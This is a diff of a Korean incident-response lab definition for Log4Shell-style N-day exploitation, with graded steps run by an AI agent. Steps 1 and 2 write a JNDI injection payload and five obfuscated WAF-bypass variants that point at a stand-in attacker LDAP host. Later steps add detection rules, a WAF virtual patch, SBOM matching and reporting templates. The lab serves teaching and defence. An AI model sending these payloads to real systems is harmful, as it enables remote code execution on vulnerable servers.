@@ -1,32 +1,146 @@
 lab_id: agent-ir-adv-ai-week06
-title: N-day 대규모 악용 IR (AI 지원)
+title: N-day 대규모 악용 (Log4Shell 계열) IR (AI 지원)
 version: ai
 course: agent-ir-adv-ai
 week: 6
-description: Log4Shell류 4시간 내 대응 파이프라인. AI SubAgent가 자동 실행·검증.
+description: 공개 후 4시간 내 대응. Virtual Patch 2h / Emergency Patch 48h SLA. AI SubAgent 자동 실행·검증.
 difficulty: hard
-duration_minutes: 120
+duration_minutes: 150
 objectives:
-- 공격 유형의 원리를 이해한다
-- 탐지·분석·초동대응·보고·재발방지의 6단계 IR 절차를 수행한다
-- Human vs Agent 대응의 차이를 비교한다
+- 공격 원리를 이해하고 재현한다
+- 탐지·분석·초동대응·보고·재발방지의 6단계를 수행한다
+- Human vs Agent 대응을 비교한다
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: SBOM 생성 시뮬
-  hint: 본 과정 공통 6단계 절차에 따라 수행
-  category: analysis
+  instruction: Log4Shell 페이로드 예시
+  hint: 6단계 IR 중 공격 단계. target_vm=web.
+  category: attack
   points: 9
-  answer: '🤖 프롬프트: SBOM 생성 시뮬
+  answer: '🤖 프롬프트: Log4Shell 페이로드 예시
+
+    📎 참고 (CLI): echo ''${jndi:ldap://attacker/a}'' > /tmp/w06-log4shell.txt && cat /tmp/w06-log4shell.txt'
+  answer_detail: '[공격] 기본 페이로드.'
+  verify:
+    type: output_contains
+    expect: jndi
+    field: stdout
+  target_vm: web
+  script: echo '${jndi:ldap://attacker/a}' > /tmp/w06-log4shell.txt && cat /tmp/w06-log4shell.txt
+  risk_level: low
+  bastion_prompt: Log4Shell 페이로드 예시
+- order: 2
+  instruction: 변형 페이로드 5종
+  hint: 6단계 IR 중 공격 단계. target_vm=web.
+  category: attack
+  points: 10
+  answer: '🤖 프롬프트: 변형 페이로드 5종
+
+    📎 참고 (CLI): cat > /tmp/w06-variants.txt <<''T''
+
+    ${${::-j}${::-n}${::-d}${::-i}:ldap://attacker/a}
+
+    ${${lower:j}ndi:ldap://attacker/a}
+
+    ${${env:BARFOO:-j}ndi:ldap://attacker/a}
+
+    ${jndi:${lower:l}${lower:d}${lower:a}p://attacker/a}
+
+    ${jndi:ldap://${::-attacker}/a}
+
+    T
+
+    cat /tmp/w06-variants.txt'
+  answer_detail: '[공격] 변형으로 WAF 우회.'
+  verify:
+    type: output_contains
+    expect: jndi
+    field: stdout
+  target_vm: web
+  script: 'cat > /tmp/w06-variants.txt <<''T''
+
+    ${${::-j}${::-n}${::-d}${::-i}:ldap://attacker/a}
+
+    ${${lower:j}ndi:ldap://attacker/a}
+
+    ${${env:BARFOO:-j}ndi:ldap://attacker/a}
+
+    ${jndi:${lower:l}${lower:d}${lower:a}p://attacker/a}
+
+    ${jndi:ldap://${::-attacker}/a}
+
+    T
+
+    cat /tmp/w06-variants.txt'
+  risk_level: low
+  bastion_prompt: 변형 페이로드 5종
+- order: 3
+  instruction: Suricata/SIGMA 룰
+  hint: 6단계 IR 중 탐지 단계. target_vm=siem.
+  category: analysis
+  points: 11
+  answer: "\U0001F916 프롬프트: Suricata/SIGMA 룰\n\U0001F4CE 참고 (CLI): mkdir -p ~/w06 && cat > ~/w06/rule.yml <<'Y'\ntitle: Log4Shell JNDI burst\ndetection:\n  selection:\n    payload|contains: ['${jndi:', '${${::-j}${::-n}']\n  condition: selection\nlevel: critical\nY\ncat ~/w06/rule.yml"
+  answer_detail: '[탐지] JNDI 패턴 탐지.'
+  verify:
+    type: output_contains
+    expect: jndi
+    field: stdout
+  target_vm: siem
+  script: "mkdir -p ~/w06 && cat > ~/w06/rule.yml <<'Y'\ntitle: Log4Shell JNDI burst\ndetection:\n  selection:\n    payload|contains: ['${jndi:', '${${::-j}${::-n}']\n  condition: selection\nlevel: critical\nY\ncat ~/w06/rule.yml"
+  risk_level: low
+  bastion_prompt: Suricata/SIGMA 룰
+- order: 4
+  instruction: CISA KEV 구독
+  hint: 6단계 IR 중 탐지 단계. target_vm=bastion.
+  category: analysis
+  points: 12
+  answer: '🤖 프롬프트: CISA KEV 구독
+
+    📎 참고 (CLI): cat > ~/w06/kev-feed.md <<''M''
+
+    - https://www.cisa.gov/known-exploited-vulnerabilities
+
+    - 일일 자동 fetch
+
+    - 신규 CVE + 조직 SBOM 매칭 시 경보
+
+    M
+
+    cat ~/w06/kev-feed.md'
+  answer_detail: '[탐지] 실제 악용 확인된 CVE만.'
+  verify:
+    type: output_contains
+    expect: KEV
+    field: stdout
+  target_vm: bastion
+  script: 'cat > ~/w06/kev-feed.md <<''M''
+
+    - https://www.cisa.gov/known-exploited-vulnerabilities
+
+    - 일일 자동 fetch
+
+    - 신규 CVE + 조직 SBOM 매칭 시 경보
+
+    M
+
+    cat ~/w06/kev-feed.md'
+  risk_level: low
+  bastion_prompt: CISA KEV 구독
+- order: 5
+  instruction: SBOM 매칭
+  hint: 6단계 IR 중 분석 단계. target_vm=bastion.
+  category: analysis
+  points: 13
+  answer: '🤖 프롬프트: SBOM 매칭
 
     📎 참고 (CLI): cat > ~/w06/sbom.json <<''J''
 
-    {"components":[{"name":"log4j-core","version":"2.14.1"}]}
+    {"components":[{"name":"log4j-core","version":"2.14.1","locations":["app-a","app-b"]}]}
 
     J
 
     cat ~/w06/sbom.json'
-  answer_detail: SBOM.
+  answer_detail: '[분석] SBOM이 있어야 분 단위 영향 평가.'
   verify:
     type: output_contains
     expect: log4j
@@ -34,132 +148,237 @@ steps:
   target_vm: bastion
   script: 'cat > ~/w06/sbom.json <<''J''
 
-    {"components":[{"name":"log4j-core","version":"2.14.1"}]}
+    {"components":[{"name":"log4j-core","version":"2.14.1","locations":["app-a","app-b"]}]}
 
     J
 
     cat ~/w06/sbom.json'
   risk_level: low
-  bastion_prompt: SBOM 생성 시뮬
-- order: 2
-  instruction: Virtual Patch — WAF 룰
-  hint: 본 과정 공통 6단계 절차에 따라 수행
+  bastion_prompt: SBOM 매칭
+- order: 6
+  instruction: 공격 시도 vs 성공 구분
+  hint: 6단계 IR 중 분석 단계. target_vm=bastion.
   category: analysis
-  points: 10
-  answer: "\U0001F916 프롬프트: Virtual Patch — WAF 룰\n\U0001F4CE 참고 (CLI): cat > ~/w06/virtual_patch.rules <<'R'\nSecRule ARGS|REQUEST_HEADERS \\\n  \"@rx \\\\$\\\\{jndi:\" \\\n  \"id:9001000,phase:2,deny,status:403\"\nR\ncat ~/w06/virtual_patch.rules"
-  answer_detail: Virtual Patch.
+  points: 14
+  answer: '🤖 프롬프트: 공격 시도 vs 성공 구분
+
+    📎 참고 (CLI): cat > ~/w06/verify.md <<''M''
+
+    - 네트워크: JNDI 페이로드 관찰 여부
+
+    - 시스템: 비정상 aws out (ldap/rmi)
+
+    - 앱: stack trace에 JndiLookup
+
+    M
+
+    cat ~/w06/verify.md'
+  answer_detail: '[분석] 3증거.'
+  verify:
+    type: output_contains
+    expect: JNDI
+    field: stdout
+  target_vm: bastion
+  script: 'cat > ~/w06/verify.md <<''M''
+
+    - 네트워크: JNDI 페이로드 관찰 여부
+
+    - 시스템: 비정상 aws out (ldap/rmi)
+
+    - 앱: stack trace에 JndiLookup
+
+    M
+
+    cat ~/w06/verify.md'
+  risk_level: low
+  bastion_prompt: 공격 시도 vs 성공 구분
+- order: 7
+  instruction: Virtual Patch WAF
+  hint: 6단계 IR 중 초동대응 단계. target_vm=web.
+  category: analysis
+  points: 15
+  answer: "\U0001F916 프롬프트: Virtual Patch WAF\n\U0001F4CE 참고 (CLI): cat > ~/w06/virtual-patch.rules <<'R'\nSecRule ARGS|REQUEST_HEADERS \\\n  \"@rx \\\\$\\\\{jndi:\" \\\n  \"id:9001000,phase:2,deny,status:403\"\nR\ncat ~/w06/virtual-patch.rules"
+  answer_detail: '[초동대응] 2시간 내 배포.'
   verify:
     type: output_contains
     expect: jndi
     field: stdout
   target_vm: web
-  script: "cat > ~/w06/virtual_patch.rules <<'R'\nSecRule ARGS|REQUEST_HEADERS \\\n  \"@rx \\\\$\\\\{jndi:\" \\\n  \"id:9001000,phase:2,deny,status:403\"\nR\ncat ~/w06/virtual_patch.rules"
+  script: "cat > ~/w06/virtual-patch.rules <<'R'\nSecRule ARGS|REQUEST_HEADERS \\\n  \"@rx \\\\$\\\\{jndi:\" \\\n  \"id:9001000,phase:2,deny,status:403\"\nR\ncat ~/w06/virtual-patch.rules"
   risk_level: low
-  bastion_prompt: Virtual Patch — WAF 룰
-- order: 3
-  instruction: CVE 피드 구독
-  hint: 본 과정 공통 6단계 절차에 따라 수행
+  bastion_prompt: Virtual Patch WAF
+- order: 8
+  instruction: Emergency Patch 결정 매트릭스
+  hint: 6단계 IR 중 초동대응 단계. target_vm=bastion.
   category: analysis
-  points: 11
-  answer: '🤖 프롬프트: CVE 피드 구독
+  points: 16
+  answer: '🤖 프롬프트: Emergency Patch 결정 매트릭스
 
-    📎 참고 (CLI): cat > ~/w06/feed.py <<''P''
+    📎 참고 (CLI): cat > ~/w06/decision.md <<''M''
 
-    # CISA KEV 주기 조회
+    - 자산 노출? → Y
 
-    import json
+    - 패치 호환성 테스트됨? → N
 
-    print(json.dumps({''cve'':''CVE-2021-44228'',''kev'':True}))
+    - SLA 수용 가능? → Y
 
-    P
+    → Virtual Patch + 주말 패치 배포
 
-    python3 ~/w06/feed.py'
-  answer_detail: 피드.
+    M
+
+    cat ~/w06/decision.md'
+  answer_detail: '[초동대응] 결정 흐름.'
   verify:
     type: output_contains
-    expect: CVE-2021
+    expect: Virtual
     field: stdout
   target_vm: bastion
-  script: 'cat > ~/w06/feed.py <<''P''
+  script: 'cat > ~/w06/decision.md <<''M''
 
-    # CISA KEV 주기 조회
+    - 자산 노출? → Y
 
-    import json
+    - 패치 호환성 테스트됨? → N
 
-    print(json.dumps({''cve'':''CVE-2021-44228'',''kev'':True}))
+    - SLA 수용 가능? → Y
 
-    P
+    → Virtual Patch + 주말 패치 배포
 
-    python3 ~/w06/feed.py'
+    M
+
+    cat ~/w06/decision.md'
   risk_level: low
-  bastion_prompt: CVE 피드 구독
-- order: 4
-  instruction: Emergency Patch SLA
-  hint: 본 과정 공통 6단계 절차에 따라 수행
+  bastion_prompt: Emergency Patch 결정 매트릭스
+- order: 9
+  instruction: Agent Playbook
+  hint: 6단계 IR 중 초동대응 단계. target_vm=bastion.
   category: analysis
-  points: 12
-  answer: '🤖 프롬프트: Emergency Patch SLA
+  points: 17
+  answer: "\U0001F916 프롬프트: Agent Playbook\n\U0001F4CE 참고 (CLI): cat > ~/w06/agent.yaml <<'Y'\nplaybook_id: pb-nday-response\nsteps:\n  - skill: fetch_cve_feed\n  - skill: match_sbom\n  - skill: deploy_virtual_patch\n  - skill: open_emergency_patch_ticket\nY\ncat ~/w06/agent.yaml"
+  answer_detail: '[초동대응] 자동 파이프라인.'
+  verify:
+    type: output_contains
+    expect: virtual_patch
+    field: stdout
+  target_vm: bastion
+  script: "cat > ~/w06/agent.yaml <<'Y'\nplaybook_id: pb-nday-response\nsteps:\n  - skill: fetch_cve_feed\n  - skill: match_sbom\n  - skill: deploy_virtual_patch\n  - skill: open_emergency_patch_ticket\nY\ncat ~/w06/agent.yaml"
+  risk_level: low
+  bastion_prompt: Agent Playbook
+- order: 10
+  instruction: 임원 브리핑
+  hint: 6단계 IR 중 보고 단계. target_vm=bastion.
+  category: analysis
+  points: 18
+  answer: '🤖 프롬프트: 임원 브리핑
 
-    📎 참고 (CLI): cat > ~/w06/sla.md <<''M''
+    📎 참고 (CLI): cat > ~/w06/exec.md <<''M''
+
+    # CVE-YYYY-NNNNN
+
+    **What**: 신규 CVE. 영향 12개. Bastion Virtual Patch.
+
+    **Impact**: 공격 시도 관찰. 악용 증거 없음.
+
+    **Ask**: Emergency Patch 야간 배포.
+
+    M
+
+    cat ~/w06/exec.md'
+  answer_detail: '[보고] 승인 요청.'
+  verify:
+    type: output_contains
+    expect: Emergency
+    field: stdout
+  target_vm: bastion
+  script: 'cat > ~/w06/exec.md <<''M''
+
+    # CVE-YYYY-NNNNN
+
+    **What**: 신규 CVE. 영향 12개. Bastion Virtual Patch.
+
+    **Impact**: 공격 시도 관찰. 악용 증거 없음.
+
+    **Ask**: Emergency Patch 야간 배포.
+
+    M
+
+    cat ~/w06/exec.md'
+  risk_level: low
+  bastion_prompt: 임원 브리핑
+- order: 11
+  instruction: VulnOps SLA
+  hint: 6단계 IR 중 재발방지 단계. target_vm=bastion.
+  category: analysis
+  points: 19
+  answer: '🤖 프롬프트: VulnOps SLA
+
+    📎 참고 (CLI): cat > ~/w06/vulnops-sla.md <<''M''
 
     - Virtual Patch: 2h
 
     - Emergency Patch: 48h
 
+    - 정기 패치: 15일
+
+    - SBOM 자동 생성: CI 통합
+
     M
 
-    cat ~/w06/sla.md'
-  answer_detail: SLA.
+    cat ~/w06/vulnops-sla.md'
+  answer_detail: '[재발방지] 조직 SLA.'
   verify:
     type: output_contains
     expect: 48h
     field: stdout
   target_vm: bastion
-  script: 'cat > ~/w06/sla.md <<''M''
+  script: 'cat > ~/w06/vulnops-sla.md <<''M''
 
     - Virtual Patch: 2h
 
     - Emergency Patch: 48h
 
+    - 정기 패치: 15일
+
+    - SBOM 자동 생성: CI 통합
+
     M
 
-    cat ~/w06/sla.md'
+    cat ~/w06/vulnops-sla.md'
   risk_level: low
-  bastion_prompt: Emergency Patch SLA
-- order: 5
-  instruction: Shadow IT 스캔 템플릿
-  hint: 본 과정 공통 6단계 절차에 따라 수행
+  bastion_prompt: VulnOps SLA
+- order: 12
+  instruction: Shadow IT 스캔
+  hint: 6단계 IR 중 재발방지 단계. target_vm=bastion.
   category: analysis
-  points: 13
-  answer: '🤖 프롬프트: Shadow IT 스캔 템플릿
+  points: 20
+  answer: '🤖 프롬프트: Shadow IT 스캔
 
-    📎 참고 (CLI): cat > ~/w06/shadow.md <<''M''
+    📎 참고 (CLI): cat > ~/w06/shadow-it.md <<''M''
 
-    - DNS 로그
+    - DNS 로그 분석
 
-    - egress 통계
+    - egress 통계 vs CMDB
 
-    - CMDB 대조
+    - 매주 diff 리뷰
 
     M
 
-    cat ~/w06/shadow.md'
-  answer_detail: Shadow IT.
+    cat ~/w06/shadow-it.md'
+  answer_detail: '[재발방지] 미파악 자산 탐지.'
   verify:
     type: output_contains
     expect: CMDB
     field: stdout
   target_vm: bastion
-  script: 'cat > ~/w06/shadow.md <<''M''
+  script: 'cat > ~/w06/shadow-it.md <<''M''
 
-    - DNS 로그
+    - DNS 로그 분석
 
-    - egress 통계
+    - egress 통계 vs CMDB
 
-    - CMDB 대조
+    - 매주 diff 리뷰
 
     M
 
-    cat ~/w06/shadow.md'
+    cat ~/w06/shadow-it.md'
   risk_level: low
-  bastion_prompt: Shadow IT 스캔 템플릿
+  bastion_prompt: Shadow IT 스캔
